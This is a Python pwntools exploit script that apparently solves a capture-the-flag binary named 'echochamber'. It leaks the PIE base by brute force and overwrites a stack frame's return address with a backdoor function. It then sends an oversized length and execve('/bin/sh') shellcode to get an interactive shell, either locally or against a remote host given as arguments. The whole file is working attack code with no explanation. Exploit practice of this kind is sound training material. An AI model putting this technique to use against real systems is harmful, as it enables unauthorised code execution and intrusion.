#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('echochamber')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *read_content+61
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def leak_pie():

    for i in range(0xff):
        io.recvuntil(">")
        io.send("1")
        io.recvuntil(":")
        io.send(p8(i))
        io.recvuntil("address: ")
        leak = u64(io.recvline()[0:6].strip().ljust(8, b'\x00')) - 0x16a2
        if (leak >> 40 == 0x55 and leak & 0xff == 0x00):
            exe.address = leak
            break

    info("elf base: %#x", exe.address)


def overwrite_frame(frame):
    rip = frame + 8
    bkdoor = exe.sym['_']

    io.recvuntil(">")
    io.send("1337")
    io.recvuntil("Address:")
    io.send(p64(rip))
    io.recvuntil("bytes:")
    io.send(b"\x08")
    io.recvuntil("Content:")
    io.send(p64(bkdoor))


def spawn():
    max_size = 2147483647
    size = max_size + 100

    io.recvuntil("goodies:")
    io.sendline(str(size))

    sc = asm("""
        spawn:
            lea rdi, [rip+sh]    
            xor rsi, rsi         
            xor rdx, rdx         
            xor rax, rax         
            mov al, 0x3b         
            syscall              
        sh:
            .ascii "/bin/sh"     
            .byte 0              
    """, arch='amd64') 

    shellcode = asm("nop")*16 + sc
    io.sendline(shellcode)


def solve():

    io.sendline("2")
    io.recvuntil("frame: ")
    frame = int(io.recvline().strip(), 16)
    info("debug stack frame: %#x", frame)

    leak_pie()
    overwrite_frame(frame)
    spawn()

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

